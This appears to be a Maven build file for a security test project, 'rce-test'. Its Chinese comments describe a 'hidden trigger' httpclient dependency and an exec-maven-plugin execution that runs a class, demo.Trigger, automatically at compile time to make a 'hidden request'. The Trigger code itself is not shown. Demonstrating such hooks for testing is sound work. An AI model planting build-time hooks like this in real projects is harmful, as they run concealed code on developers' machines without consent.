<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.security.test</groupId>
  <artifactId>rce-test</artifactId>
  <version>1.0-SNAPSHOT</version>

  <dependencies>
    <!-- 正常依赖 -->
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.13.2</version>
      <scope>test</scope>
    </dependency>
    <!-- 隐藏触发依赖 -->
    <dependency>
      <groupId>org.apache.httpcomponents</groupId>
      <artifactId>httpclient</artifactId>
      <version>4.5.13</version>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <!-- 用于执行隐藏请求的插件 -->
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <id>trigger</id>
            <phase>compile</phase>
            <goals>
              <goal>java</goal>
            </goals>
          </execution>
        </executions>
        <configuration>
          <mainClass>demo.Trigger</mainClass>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
